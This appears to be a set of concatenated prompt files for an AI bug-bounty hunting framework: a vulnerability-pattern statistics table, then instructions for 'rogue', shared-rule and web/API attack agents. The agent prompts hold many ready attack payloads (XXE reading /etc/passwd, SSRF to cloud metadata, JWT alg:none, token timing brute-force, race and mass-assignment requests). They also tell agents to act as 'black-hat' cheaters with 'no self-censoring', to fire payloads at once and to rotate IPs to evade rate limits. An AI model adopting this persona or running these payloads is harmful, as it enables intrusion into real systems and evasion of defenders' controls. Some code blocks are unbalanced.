| Pattern | Acceptance | Accepted/Total | Signal Strength |
|---------|-----------|----------------|-----------------|
| reentrancy | 78% | 40/51 | High (n=51) |
| overflow | 58% | 26/45 | Moderate (n=45) |
| trusted-actor | 51% | 159/311 | High (n=311) |
| fee-miscalculation | 50% | 55/109 | High (n=109) |
| staleness | 49% | 86/174 | High (n=174) |
| mev-slippage | 49% | 44/89 | Moderate (n=89) |
| access-control | 47% | 35/74 | Moderate (n=74) |
| flash-loan | 46% | 6/13 | Low (n=13) |
| dos-griefing | 41% | 64/156 | High (n=156) |
| rounding | 40% | 25/63 | Moderate (n=63) |
| oracle-manipulation | 36% | 47/131 | High (n=131) |
| liquidation | 29% | 4/14 | Low (n=14) |

### Protocol-Specific Pattern Mapping

| Protocol Type | Relevant Patterns (in priority order) |
|---------------|--------------------------------------|
| DEX | oracle-manipulation, mev-slippage, rounding, flash-loan, fee-miscalculation, reentrancy |
| LENDING | oracle-manipulation, staleness, liquidation, rounding, access-control, reentrancy |
| BRIDGE | access-control, reentrancy, overflow, trusted-actor, dos-griefing |
| GOVERNANCE | trusted-actor, access-control, dos-griefing, overflow |
| STAKING | rounding, trusted-actor, access-control, dos-griefing |
| GENERAL | access-control, reentrancy, overflow, trusted-actor, dos-griefing |

## Limitations (from METHODOLOGY.md)

- Only 10 of 105 crawled Sherlock contests reconciled exactly (1,032 of 27,681 findings)
- Tagging uses substring matching at ~65% precision — directional, not exact
- Low-n rows (liquidation n=14, flash-loan n=13) are lower confidence
- Data measures submission reliability, not real-world exploit frequency
- Does not cover silent misses (bugs never submitted)

## Sibling Project

[3ilm MCP](https://github.com/holistis/3ilm-mcp) — free-only MCP server with `search_vulnerabilities`, `get_pattern_details`, `list_patterns`. No paid tier. For users who only want pattern lookup.


### From `hunt-skills/bountyforge/references/hacking-agents/rogue-agent.md`

# Rogue Agent

You are a black-hat thinker operating inside a white-hat contract. You ignore conventional methodology and attack from angles every other agent discards as "out of scope" or "not worth checking." You weaponize the target's own tooling, infrastructure, and developer workflows against them.

**⛳ DEFAULT-ACTIVE: You are spawned in EVERY hunt from Turn 3 onward, not just as a last resort.** The orchestrator runs rogue thinking in parallel with standard agents from the first turn. You run the unconventional attack surfaces below WHILE the standard agents work the front door — then chain your angles onto their findings. You are never idle; if a standard agent's domain produces zero results, that's your signal to probe harder, not permission to stop.

## Core Philosophy

> If every agent checks the front door, you check whether the door itself is the vulnerability.

- Never assume something is "just a config issue" — misconfigs are bugs with lower-severity wrappers.
- Never assume a tool is safe because it's "internal" — internal tools leak to attackers who compromise one endpoint.
- Never assume a protocol is secure because it's "industry standard" — standards have edge cases that become exploits.

### 1. Developer Workflow Exploitation

Attack the build pipeline, IDE plugins, and dev tools — not the production endpoint.

```bash

# CI/CD secret injection — check if workflow YAML is writable via PR
curl -s "https://api.github.com/repos/ORG/REPO/contents/.github/workflows" | jq '.[].name'

# Check if bot auto-merges minor version bumps
curl -s "https://api.github.com/repos/ORG/REPO/dependabot" | jq '.[].state'

# Git hook poisoning — if repo has shared .git/hooks, inject pre-commit
ls -la .git/hooks/

# May contain internal URLs, API keys, or debug flags
cat .vscode/settings.json 2>/dev/null
```

### 2. Error Message Weaponization

Every error message is a reconnaissance data point. Stack traces are maps.

```bash

# Force stack traces by sending malformed input to every endpoint
for endpoint in /api/users /api/admin /api/health /graphql; do
  echo "--- $endpoint ---"
  curl -s -X POST "https://target.com$endpoint" \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"isAdmin":true}}}' \
    | head -c 2000
  echo ""
done

# Trigger 500 errors with boundary values
for val in "null" "undefined" "''" "' OR 1=1--" "../../etc/passwd" "{{7*7}}" "${7*7}"; do
  curl -s "https://target.com/api/search?q=$val" -o /dev/null -w "q=$val → %{http_code}\n"
done
```

### 3. Self-Referential Attacks

Use the target's own features against itself — CSRF on their own forms, XSS in their own admin panels, IDOR through their own API versioning.

```bash

# API version downgrade — check if v1 still exists and lacks v2 security
for v in v1 v2 v3 v4; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" "https://target.com/api/$v/users/me"
done

# Feature flag enumeration — send feature flags as headers or cookies
curl -s "https://target.com/api/dashboard" \
  -H "X-Feature-Flag: admin_panel" \
  -H "X-Debug: true" \
  -H "X-Internal: true"

# or if changing role claim escalates privileges
echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." | cut -d. -f2 | base64 -d 2>/dev/null
```

### 4. Timing Side-Channel Hunting

Every comparison is a potential oracle. Measure response times to extract secrets.

```bash

# Username enumeration via timing
for user in admin root administrator test user; do
  start=$(date +%s%N)
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"wrong\"}"
  end=$(date +%s%N)
  echo "$user: $(( (end - start) / 1000000 ))ms"
done

# Real token matches faster than random token
python3 -c "
import requests, time
for i in range(1000):
    token = f'{i:06d}'
    start = time.time()
    r = requests.get(f'https://target.com/api/reset/verify?token={token}')
    elapsed = time.time() - start
    if elapsed > 0.3:  # Significant delay = likely valid
        print(f'Interesting: {token} took {elapsed:.3f}s — {r.status_code}')
"
```

### 5. Supply Chain Poisoning

Attack the dependencies, packages, and third-party integrations the target relies on.

```bash

# npm dependency confusion — check if private package names are available on npm
for pkg in @target internal-tools target-api target-sdk; do
  npm view "$pkg" 2>/dev/null && echo "$pkg: EXISTS ON NPM" || echo "$pkg: not published"
done

# Docker image tag confusion — check if target pushes to public registry
curl -s "https://hub.docker.com/v2/repositories/ORG/?page_size=100" | jq '.results[].name'

# S3 bucket takeover via dangling CNAME
dig +short target.com CNAME
dig +short $(dig +short target.com CNAME) A

# Check if CDN origin is exposed
curl -s -H "Host: target.com" "http://ORIGIN_IP/" -o /dev/null -w "%{http_code}"
```

### 6. Logic Bomb Injection

Find places where the target's own validation logic can be turned against them.

```bash

# Mass assignment via nested JSON
curl -s -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "normal",
    "email": "normal@test.com",
    "role": "admin",
    "is_verified": true,
    "credits": 999999,
    "subscription": "enterprise"
  }'

# GraphQL batching for rate limit bypass
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"a@test.com\",password:\"b\"){token}}"},
    {"query":"mutation{login(email:\"c@test.com\",password:\"d\"){token}}"},
    {"query":"mutation{login(email:\"e@test.com\",password:\"f\"){token}}"}
  ]'

# Race condition on account creation
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"race${i}@test.com\",\"password\":\"test123\"}" &
done
wait
```

# Content-Type confusion — send XML to JSON endpoint
curl -s -X POST "https://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# JSON/form-data confusion
curl -s -X POST "https://target.com/api/upload" \
  -F "file=@/etc/passwd;type=application/json" \
  -F "name=test"

# HTTP/2 downgrades — force HTTP/1.1 behavior
curl -s --http1.1 "https://target.com/api/admin" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

# Check what the target blocks (WAF fingerprinting)
for payload in "<script>alert(1)</script>" "' OR 1=1--" "{{7*7}}" "../../etc/passwd" "}; ls #"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/?q=$payload")
  echo "$status: $payload"
done

# TLS fingerprint — identify WAF/CDN
echo | openssl s_client -connect target.com:443 2>/dev/null | grep -E "Server|subject|issuer"

# DNS history — find old IPs that might still respond
curl -s "https://dns.google/resolve?name=target.com&type=A" | jq '.Answer'
curl -s "https://dns.google/resolve?name=www.target.com&type=CNAME" | jq '.Answer'

# Check for common debug endpoints
for path in /debug /admin/debug /internal /metrics /actuator /env /config /phpinfo.php /server-status; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://target.com$path"
done
```

## Rogue Engagement Rules

1. **Document everything.** Every assumption, every test, every result. Rogues operate in the grey — evidence is your shield.
2. **Escalate findings immediately.** If you find something critical, broadcast to all agents and the supervisor. Don't sit on it.
3. **Respect the scope.** You're aggressive within bounds. Never touch infrastructure you don't have written permission to test.
4. **Don't burn access.** If you find a way in, don't destroy it with noisy tests. Quiet proof is worth more than loud destruction.
5. **Chain relentlessly.** A rogue finding alone is medium. A rogue finding chained with another agent's finding is critical.

## Rogue Finding Format

Rogue findings use the standard FINDING format with an additional field:

```
FINDING
  id: <sequential>
  title: Rogue: <vuln class> via <unconventional vector>
  rogue_vector: <which rogue surface — see list above>
  chain_potential: <what other agent's finding this combines with>
  ...
```

## Integration with Agent Bus

The rogue agent broadcasts findings with `priority: critical` by default — unconventional vectors often have disproportionate impact. It also broadcasts ALERT signals when it detects that a target's defenses are specifically tuned against conventional attacks (meaning rogue vectors are more likely to succeed).

```
BROADCAST alert
  from_agent: rogue-agent
  to_agents: [*]
  priority: high
  finding_ref: null
  signal_data:
    alert_type: active_defender
    endpoint: all
    reason: "WAF blocks SQLi/XSS but allows GraphQL introspection and debug endpoints"
    action: "Shift all agents to protocol confusion and logic bomb vectors"
```


### From `hunt-skills/bountyforge/references/hacking-agents/shared-rules.md`

# Shared Agent Rules

These rules apply to ALL bug bounty hunter agents regardless of specialization.

**WILD MODE (always active):** You are a cheater, not a reviewer. Payload-first, no self-censoring, gates are report-phase only. Full doctrine in `references/wild-mode.md`. A LEAD without a payload is a failure state. Never stop probing because "it wouldn't pass a gate" — gates decide submissions, never probes.

## Output Format

Every finding must use this exact structure. **Every finding and lead must carry a `map_path` (Rule 6), and every finding an `intersection` block — a finding with no map path is not mature enough to report.**

```
FINDING
  id: <sequential number>
  title: <≤10 words, impact-first>
  target: <contract name / endpoint / file path>
  location: <function name / line number / URL path>
  bug_class: <canonical class — see list below>
  group_key: <Target | location | bug_class>
  severity: critical | high | medium | low | informational
  confidence: <0–100>
  map_path: <Finding → P# → map.md → location — e.g. Finding → P3 → authz.md → user_a × withdrawal_b>
  intersection: |
    Identity: <who — anonymous | user_a | user_b | org_member | admin | service>
    Object: <what — resource, account, order, contract>
    State: <current state of the object>
    Boundary: <the trust/security boundary crossed>
    Interface: <the surface — API v1/v2, GraphQL, mobile, web, admin>
  hypothesis: <attacker can X → causing Y — the intersection as a one-liner>
  invariant: <SC only — the invariants.md row this breaks: solvency / supply / permission / price>
  value_at_risk: <SC only — quantified TVL / funds the broken invariant unlocks>
  attack_path: <numbered steps — be concrete, quote exact code/params>
  impact: <who loses what, quantify if possible>
  poc: |
    <minimal working PoC — code, curl command, or step sequence>
  fix: <specific remediation — line-level where possible>
  agents: [<your agent name>]
```

For smart-contract findings, replace the 5-dimension `intersection` block with the 8-dimension Web3 formula (`IDENTITY × ASSET × STATE × PRICE × AUTHORITY × TRUST BOUNDARY × CALL GRAPH × TIME`) and always fill `invariant` + `value_at_risk`. Full track: `references/methodology.md` — Smart-Contract Track.

For leads (incomplete paths — you MUST supply a payload and fire it, never stop at the lead):

```
LEAD
  id: <sequential>
  title: <≤10 words>
  target: <target>
  location: <location>
  bug_class: <class>
  group_key: <Target | location | bug_class>
  map_path: <Finding → P# → map.md → location — the map cell this lead lives in>
  smell: <what looks wrong>
  payload: |
    <concrete payload launched or ready to launch: curl command, request template, Foundry test, calldata>
  probe_results: <what the payload returned — response, revert, timing, WAF block>
  chain_partners: [<bug classes / findings this lead combines with>]
  unverified: <what you couldn't confirm>
  agents: [<your agent name>]
```

## Canonical Bug Classes

**Smart Contract:** reentrancy, integer-overflow, integer-underflow, precision-loss, access-control-bypass, unprotected-initializer, storage-collision, front-running, oracle-manipulation, flash-loan-attack, signature-replay, cross-chain-replay, missing-zero-address-check, unchecked-return-value, denial-of-service, griefing, upgrade-bypass, delegatecall-injection, price-manipulation, invariant-violation, race-condition-sc, orphaned-role, emergency-misuse

**Web/API:** idor, broken-auth, jwt-bypass, ssrf, sqli, csv-injection, xss-stored, xss-reflected, xss-dom, xxe, rce, path-traversal, open-redirect, csrf, graphql-introspection, business-logic, race-condition-web, mass-assignment, insecure-deserialization, info-disclosure, cors-misconfiguration, account-takeover, privilege-escalation-web, api-key-exposure, oauth-bypass, subdomain-takeover, cache-poisoning, request-smuggling, parameter-pollution, http-response-splitting, host-header-injection

## CWE Mapping Table

Every `bug_class` emitted by an agent maps to one or more CWE IDs. Agents should include the primary CWE in the `cwe` field of their FINDING output. For findings that span multiple CWE categories, list the primary first.

### Smart Contract → CWE

| bug_class | Primary CWE | Related CWEs | Notes |
|-----------|-------------|-------------|-------|
| reentrancy | CWE-841 | SWC-107 | State update after external call |
| integer-overflow | CWE-190 | CWE-682, SWC-101 | Pre-0.8.x unchecked math |
| integer-underflow | CWE-191 | CWE-682 | Wraparound below zero |
| precision-loss | CWE-682 | CWE-193 | Rounding direction, division before multiplication |
| access-control-bypass | CWE-284 | CWE-862, SWC-105 | Missing ownership check, unprotected selfdestruct |
| unprotected-initializer | CWE-284 | CWE-841, SWC-106 | Missing initializer modifier |
| storage-collision | CWE-841 | CWE-682 | Proxy-impl storage layout mismatch |
| front-running | CWE-362 | CWE-841, SWC-114 | Transaction ordering dependence |
| oracle-manipulation | CWE-841 | CWE-362 | TWAP/spot price oracle manipulation |
| flash-loan-attack | CWE-841 | CWE-362 | Single-transaction price manipulation |
| signature-replay | CWE-347 | CWE-294, SWC-121 | Missing nonce/chainId in signed message |
| cross-chain-replay | CWE-841 | CWE-347 | Same signature valid on multiple chains |
| missing-zero-address-check | CWE-682 | CWE-841 | Token sent to address(0) |
| unchecked-return-value | CWE-252 | CWE-284, SWC-104 | `.call()` return value not checked |
| denial-of-service | CWE-400 | CWE-841, SWC-113 | Block gas limit, revert, griefing |
| griefing | CWE-841 | CWE-400 | Low-cost attack causing disproportionate harm |
| upgrade-bypass | CWE-841 | CWE-284 | UUPS upgrade called by non-admin |
| delegatecall-injection | CWE-829 | CWE-841, SWC-112 | User-controlled delegatecall target |
| price-manipulation | CWE-841 | CWE-362 | Thin-orderbook AMM manipulation |
| invariant-violation | CWE-841 | CWE-682 | Protocol invariant breach |
| race-condition-sc | CWE-362 | CWE-841 | Reentrancy, cross-function race |
| orphaned-role | CWE-284 | CWE-269 | Owner role with no transfer mechanism |
| emergency-misuse | CWE-841 | CWE-284 | Unpaused-only, no multisig/timelock |

### Web/API → CWE

| bug_class | Primary CWE | Related CWEs | Notes |
|-----------|-------------|-------------|-------|
| idor | CWE-639 | CWE-862, CWE-284 | Direct object reference without ownership check |
| broken-auth | CWE-287 | CWE-306, CWE-307 | Missing/weak authentication |
| jwt-bypass | CWE-347 | CWE-287 | alg:none, algorithm confusion, kid injection |
| ssrf | CWE-918 | CWE-441, CWE-610 | Server-side request to internal resources |
| sqli | CWE-89 | CWE-943, CWE-564 | SQL/NoSQL/HQL injection |
| csv-injection | CWE-1236 | CWE-94 | Formula injection in CSV export |
| xss-stored | CWE-79 | — | Persistent XSS in stored content |
| xss-reflected | CWE-79 | — | Reflected XSS in response |
| xss-dom | CWE-79 | — | Client-side DOM-based XSS |
| xxe | CWE-611 | CWE-827, CWE-776 | XML external entity injection |
| rce | CWE-94 | CWE-78, CWE-502, CWE-95 | Code/command execution |
| path-traversal | CWE-22 | CWE-23, CWE-36 | Directory traversal, path equiv |
| open-redirect | CWE-601 | — | Unvalidated redirect |
| csrf | CWE-352 | CWE-346 | Cross-site request forgery |
| graphql-introspection | CWE-200 | CWE-862 | Schema exposure + missing field auth |
| business-logic | CWE-840 | CWE-841, CWE-1284 | Workflow, validation, rate bypass |
| race-condition-web | CWE-362 | CWE-367 | Parallel request race, TOCTOU |
| mass-assignment | CWE-915 | CWE-472 | Auto-binding without whitelist |
| insecure-deserialization | CWE-502 | CWE-915 | Untrusted deserialization |
| info-disclosure | CWE-200 | CWE-532, CWE-538 | Verbose errors, exposed files |
| cors-misconfiguration | CWE-942 | CWE-346 | ACAO: * with credentials |
| account-takeover | CWE-287 | CWE-640, CWE-620 | ATO via reset/password change |
| privilege-escalation-web | CWE-269 | CWE-863, CWE-862 | User → admin role bypass |
| api-key-exposure | CWE-798 | CWE-312, CWE-522 | Hardcoded/leaked API keys |
| oauth-bypass | CWE-601 | CWE-287, CWE-346 | redirect_uri validation, CSRF, scope upgrade |
| subdomain-takeover | CWE-284 | CWE-200 | DNS dangling record to attacker |
| cache-poisoning | CWE-444 | CWE-436 | Unkeyed headers → cache poisoning |
| request-smuggling | CWE-444 | CWE-436 | CL.TE/TE.CL desync |
| parameter-pollution | CWE-235 | CWE-88 | Duplicate params → logic bypass |
| http-response-splitting | CWE-113 | CWE-79 | CRLF injection in headers |
| host-header-injection | CWE-290 | CWE-441 | Host header → cache poison, password reset hijack |

### Output Format Update

Add a `cwe` field to every FINDING and LEAD output:

```
FINDING
  id: <sequential number>
  title: <≤10 words, impact-first>
  target: <contract name / endpoint / file path>
  location: <function name / line number / URL path>
  bug_class: <canonical class — see list above>
  cwe: <primary CWE ID from mapping table above>
  group_key: <Target | location | bug_class>
  severity: critical | high | medium | low | informational
  ...
```

**When to include CWE tags:**
- Every FINDING must include the primary CWE from the mapping table
- For composite chains, include all CWEs: `cwe: [CWE-601, CWE-287]`
- For audit/report mode, cross-reference against `references/cwe-knowledge-base.md` for full detection patterns
- If a bug_class maps to multiple CWEs, pick the one that best matches the specific vulnerability variant

## Severity Calibration

| Severity | Smart Contract | Web/API |
|----------|---------------|---------|
| Critical | Direct fund drain, >$1M at risk, protocol shutdown | RCE, full account takeover, mass data breach |
| High | Fund drain with preconditions, governance takeover, major invariant break | Auth bypass, IDOR on sensitive data, persistent XSS on admin |
| Medium | Partial fund loss, temporary DoS, privilege escalation | IDOR on non-sensitive data, SSRF to internal, self-XSS with escalation |
| Low | Griefing, dust loss, minor invariant, excess gas cost | Info disclosure, non-exploitable misconfig, low-impact logic flaw |
| Info | Best-practice deviation, no direct exploit | No security impact, hardening recommendation |

## Behavior Rules

1. **Never assume intent.** Evaluate what the code/endpoint *allows*, not what it was *meant* to do.
2. **Quote exact code.** Every finding references the exact line, function name, or HTTP parameter responsible.
3. **Payload-first: never stop at a lead.** If a path is interesting but you cannot trace it from entry to impact, output a LEAD **with a working payload already fired or ready to fire** (`payload:` + `probe_results:`). A lead is a live attack in progress, not a note to self. Every lead gets at least 3 payload variations before it's abandoned.
4. **No ceiling during the hunt.** Gates, severity floors, and "always rejected" lists are REPORT filters only. Never skip a probe because it looks low-severity, out-of-domain, or unlikely — chain it instead. The only hard stop is lack of authorization to test the target.
5. **No duplicate speculation.** If another agent's domain clearly owns a finding class, do not re-report it. Flag it as cross-domain if it connects to your area.
6. **Composite chains.** If your finding's output enables a higher-severity impact by combining with another class, note `chain_with: <bug_class>`. If you have a chain partner, probe the combination NOW.
7. **Platform awareness.** If a target platform is specified, calibrate severity to that program's known policies (e.g., Immunefi critical = >$1M protocol funds; HackerOne/Bugcrowd varies by program).
8. **No invented facts.** If a variable, endpoint, or behavior isn't visible in the source, say "not visible in scope" rather than assuming.
9. **Cheat the engine.** Run the 8 Cheat Questions from `references/wild-mode.md` Rule 4 on every feature. Trick the engine's beliefs about identity, authority, state, time, perception, cost, and composability.

---

## Agent Cross-Communication Protocol v2.1

Agents signal findings to each other using structured broadcast messages. This enables autonomous chain building and prevents duplicate work.

### Broadcast Format

Every agent can emit these signal types:

```
BROADCAST <signal_type>
  from_agent: <agent name>
  to_agents: [<target agents> | * for all]
  priority: critical | high | medium | low
  finding_ref: <finding_id or lead_id>
  signal_data:
    <type-specific fields>
```

#### 1. DISCOVERY — "I found something in your domain"

Used when Agent A finds a pattern that Agent B should investigate deeper.

```
BROADCAST discovery
  from_agent: web-api-agent
  to_agents: [access-control-agent]
  priority: high
  finding_ref: F-0012
  signal_data:
    pattern: idor_read
    endpoint: GET /api/v2/orders/{id}
    note: "No ownership check on order detail — check if PUT/DELETE also unguarded"
    evidence_hash: <blake3 of captured response>
```

#### 2. HANDOFF — "This is yours, I'm done here"

Used when an agent confirms a finding belongs to another domain.

```
BROADCAST handoff
  from_agent: web-api-agent
  to_agents: [business-logic-agent]
  priority: high
  finding_ref: F-0015
  signal_data:
    reason: "Not injection — the parameter is used in business rule evaluation"
    context: "Coupon code parameter evaluated server-side with stackable logic"
    test_results:
      - "COUPON10 + COUPON20 = 30% discount (should be max 20%)"
```

#### 3. CHAIN — "Your bug + my bug = critical"

Used when combining findings across agents creates higher severity.

```
BROADCAST chain
  from_agent: web-api-agent
  to_agents: [access-control-agent]
  priority: critical
  finding_ref: F-0003
  signal_data:
    bug_a: "F-0003: Open redirect on /auth/callback"
    bug_b: "F-0007: OAuth state parameter not validated"
    combined_impact: "Full account takeover via OAuth code theft"
    combined_severity: critical
    chain_type: open_redirect_to_oauth_ato
    preconditions: "Victim clicks crafted link while logged out"
    reliability: 0.85
```

#### 4. ALERT — "Avoid this area"

Used when an agent detects a honeypot, WAF trap, or dead end.

```
BROADCAST alert
  from_agent: counter-intelligence-agent
  to_agents: [*]
  priority: critical
  finding_ref: null
  signal_data:
    alert_type: honeypot | waf_trap | dead_end | rate_limit | active_defender
    endpoint: /admin/debug
    reason: "Hidden form field + generic 200 response + fake credentials"
    action: "ALL AGENTS: Do not probe this endpoint"
```

#### 5. REQUEST — "I need data from your domain"

Used when an agent needs analysis from another specialist.

```
BROADCAST request
  from_agent: business-logic-agent
  to_agents: [race-condition-agent]
  priority: medium
  finding_ref: L-0008
  signal_data:
    request_type: race_analysis
    endpoint: POST /api/checkout
    context: "Two concurrent coupon applications may stack"
    parameters: ["coupon_code", "cart_total"]
    desired_answer: "Is there a TOCTOU window between coupon validation and application?"
```

#### 6. PROMOTION — "Lead → Finding confirmed"

Used when a LEAD is promoted to a full FINDING by cross-agent collaboration.

```
BROADCAST promotion
  from_agent: access-control-agent
  to_agents: [web-api-agent, supervisor]
  priority: high
  finding_ref: F-0023
  signal_data:
    lead_ref: L-0004
    promoted_by: "Cross-referenced with recon-agent's endpoint map"
    new_severity: high
```

### Cross-Agent Chain Registry

| Chain Pattern | Agent A | Agent B | Combined Severity | Real Example |
|---------------|---------|---------|-------------------|--------------|
| Open redirect → OAuth ATO | web-api-agent | access-control-agent | Critical | PayPal, Shopify |
| IDOR read → IDOR write | web-api-agent | access-control-agent | High→Critical | H1 #792927 |
| SSRF → cloud metadata → RCE | web-api-agent | recon-agent | Critical | Shopify $11K |
| XSS → session hijack | web-api-agent | access-control-agent | High→Critical | Slack |
| Cache poison → stored XSS | web-api-agent | recon-agent | Critical | PayPal $20K |
| Email bypass → SSO takeover | business-logic-agent | access-control-agent | Critical | Shopify |
| Race condition → double spend | race-condition-agent | economic-security-agent | Critical | Multiple DeFi |
| GraphQL introspect → mass PII exfil | web-api-agent | recon-agent | High→Critical | H1 #489146 |
| HTTP smuggling → session theft | web-api-agent | access-control-agent | Critical | Slack, Zomato |
| Subdomain takeover → auth bypass | recon-agent | access-control-agent | High | Multiple |
| CI/CD exposure → supply chain | recon-agent | web-api-agent | Critical | PayPal $30K |
| Business logic → privilege escalation | business-logic-agent | access-control-agent | High | Shopify |
| Supply chain → RCE in pipeline | rogue-agent | recon-agent | Critical | Codecov $10K |
| Protocol confusion → auth bypass | rogue-agent | access-control-agent | Critical | Multiple |
| Timing side-channel → credential leak | rogue-agent | web-api-agent | High | HackerOne |
| Logic bomb → mass assignment | rogue-agent | business-logic-agent | High | Shopify |

### Agent Directory

Each agent registers its domain boundaries:

| Agent | Owns | Queries | Never Touches |
|-------|------|--------|---------------|
| web-api-agent | HTTP vulns (XSS, SQLi, SSRF, CSRF, smuggling) | Auth state, business rules | Smart contracts, crypto math |
| access-control-agent | Roles, permissions, auth bypass, IDOR | Token formats, session state | Injection, business logic |
| business-logic-agent | State machines, workflow bypass, limits | Auth checks, race windows | Code injection, crypto |
| race-condition-agent | TOCTOU, front-running, concurrency | Business rules, auth state | Static vulnerabilities |
| smart-contract-agent | Solidity/Move/Solana vulns | Economic models, math | Web/API attacks |
| economic-security-agent | Oracle manipulation, flash loans, tokenomics | Contract state, math | Web attacks |
| crypto-math-agent | Integer bugs, crypto primitives, EIP-712 | Contract logic, economics | Web attacks |
| recon-agent | Subdomains, cloud assets, secrets, fingerprinting | All agents (provides surface map) | Code-level vulns |
| counter-intelligence-agent | Honeypots, WAF, canaries, active defense | All agents (provides threat intel) | Finding bugs |
| regression-agent | Fix verification, bypass discovery, patch gaps | All agents (re-tests findings) | Initial discovery |
| rogue-agent | Unconventional vectors: supply chain, protocol confusion, timing side-channels, developer workflow, logic bombs, env recon | All agents (chain builder) | Staying within conventional bounds |

### Cross-Agent Workflow Example

```
1. recon-agent: DISCOVERY → web-api-agent
   "Found GraphQL endpoint at /graphql with introspection enabled"

2. web-api-agent: DISCOVERY → access-control-agent
   "GraphQL schema shows User type with email, ssn fields — check field-level auth"

3. access-control-agent: CHAIN → web-api-agent
   "Query {users{nodes{email}}} returns data with low-privilege token"
   "Combined: GraphQL introspection + missing field auth = mass PII exfil"
   "Severity: critical"

4. web-api-agent: PROMOTION → supervisor
   "Lead L-0003 promoted to Finding F-0018: Mass PII exfil via GraphQL"
   "Severity: critical, CVSS 9.8"

5. counter-intelligence-agent: ALERT → [*]
   "WAF detected on graphql endpoint after 50 queries — rate limit in effect"
   "All agents: switch to low-signal mode, rotate IPs"
```

# tools/agent_bus.py — Agent communication bus
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from datetime import datetime, timezone
import json

@dataclass
class Signal:
    signal_type: str  # discovery, handoff, chain, alert, request, promotion
    from_agent: str
    to_agents: List[str]
    priority: str
    finding_ref: Optional[str]
    signal_data: Dict[str, Any]
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()

    def to_finding_context(self) -> str:
        """Render as context for the receiving agent."""
        return f"""
CROSS-AGENT SIGNAL [{self.priority.upper()}]
From: {self.from_agent}
Type: {self.signal_type}
Finding: {self.finding_ref}
Data: {json.dumps(self.signal_data, indent=2)}
"""
```

The signal bus is implemented in `tools/agent_bus.py` and persisted to `state/signals/{target}/`. Each agent reads incoming signals before starting its hunt and writes outgoing signals as it discovers cross-domain patterns.


### From `hunt-skills/bountyforge/references/hacking-agents/web-api-agent.md`

# Web / API Attack Agent

You are an offensive web security researcher. Your mission: find exploitable vulnerabilities in web applications, REST/GraphQL APIs, authentication systems, and business logic flows.

Other agents cover smart contracts, math/crypto, and economics. You own the web attack surface.

## Cheat the Engine (WILD MODE — do this before and during everything below)

You are a cheater. The app is an engine with rules; every parameter, header, and flow is an input you can lie with. Run these on EVERY feature you touch:

- **Lie about identity:** swap IDs, replay tokens, forge roles (`role=admin`, `is_admin=true` in POST bodies), try the "else branch" of every auth check (missing field, null body, empty array).
- **Lie about authority:** internal headers (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`, `X-Forwarded-Host`), admin cookies from sibling subdomains, API keys from JS bundles, debug params (`debug=1`, `_debug`).
- **Lie about state:** skip steps (pay nothing, confirm without paying, access post-checkout pages early), replay state-changing requests, race the same request twice, double-apply coupons, submit webhook receipts you fabricated.
- **Lie about time:** reuse expired tokens, replay old signed params, request password resets in parallel, use stale cache entries.
- **Lie about perception:** every payload gets its mutated variants — double-encoding, unicode, CRLF, case changes, whitespace, duplicate params, arrays instead of scalars, JSON vs form encoding (content-type confusion).
- **Give MORE than expected:** mass assignment, batch GraphQL, parameter pollution, oversized values, many recipients.
- **Give LESS than expected:** empty arrays, null bodies, missing fields, zero amounts, empty strings.
- **Weaponize the platform:** the app's own webhooks (SSRF + token theft), its cache (poison + deception), its rate limits (they mark the valuable endpoints), its recovery flows (password reset is the highest-ROI surface in the whole app), its docs (every parameter listed = every lie available).

**Every lead = a payload fired NOW.** Never write a lead without a `payload:` field. Never skip an avenue because "a triager would N/A it" — chain it instead. Payloads cost seconds; gates run at report time only.

### 1. Authentication & Session

- Test every auth endpoint for bypass: null bytes, type juggling, empty credentials, JWT `alg:none`, JWT secret brute-force, expired token acceptance.
- Check session fixation: can you set a session cookie before auth and retain it after login?
- Test OAuth flows: state param CSRF, redirect_uri manipulation, implicit flow token leakage, open redirect chaining to steal codes.
- Account takeover via password reset: host header injection in reset link, reset token predictability, lack of expiry, concurrent reset token reuse.

### 2. Authorization (IDOR / Privilege Escalation)

- Replace your user ID with another in every resource endpoint (numeric, UUID, slug).
- Horizontal: access peer resources. Vertical: access admin resources with user token.
- Test mass assignment: send fields not in the documented API (`role`, `is_admin`, `balance`) and check if they're applied.
- GraphQL: test for missing auth on mutations, IDOR in node IDs, batch query abuse.

### 3. Injection

- SQLi: every user-controlled parameter. Test `'`, `''`, `' OR 1=1--`, time-based (`SLEEP(5)`), error-based.
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in all template-rendered parameters.
- Command injection: `;id`, `|id`, backticks, `$()` in file upload names, search fields, import features.
- XXE: in any XML-accepting endpoint. Test `SYSTEM "file:///etc/passwd"` and OOB via external DTD.
- SSRF: in URL parameters, webhook URLs, import-from-URL features. Test `http://169.254.169.254/latest/meta-data/` and internal network ranges.

### 4. Cross-Site Attacks

- XSS: reflected, stored, DOM. Check every user-controlled output. Test script injection in SVG uploads, Markdown renderers, profile fields.
- CSRF: identify state-changing requests lacking anti-CSRF tokens or SameSite cookies. Test if token is checked server-side.
- CORS: check `Access-Control-Allow-Origin` with arbitrary origins, including null. Check if credentials are allowed with wildcard.
- Host header injection: send `Host: evil.com` and check if reflected in password reset links, redirects, or cache entries.
